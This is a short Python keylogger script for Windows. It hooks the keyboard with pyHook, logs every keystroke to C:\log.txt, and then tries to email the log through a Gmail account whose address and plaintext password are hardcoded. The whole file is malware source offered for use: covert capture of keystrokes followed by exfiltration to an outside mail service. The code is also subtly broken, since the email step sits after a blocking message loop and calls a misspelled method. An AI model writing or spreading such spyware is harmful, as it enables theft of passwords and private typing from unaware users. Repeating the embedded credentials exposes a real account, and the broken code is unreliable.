import pyHook, pythoncom, sys, logging
from pygmail import pygmail
log_file = "C:\\log.txt"

def OnKeyboardEvent(event):
    logging.basicConfig(filename = log_file, level = logging.DEBUG, format = '%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()


g = pygmail()
g.login('nick.tsilivis@gmail.com', 'notorious3')
g.send_email_with_attachmen("nick.tsilivis@gmail.com", "nick.tsilivis@gmail.com", "log from keylogger", "C:\\", "log.txt")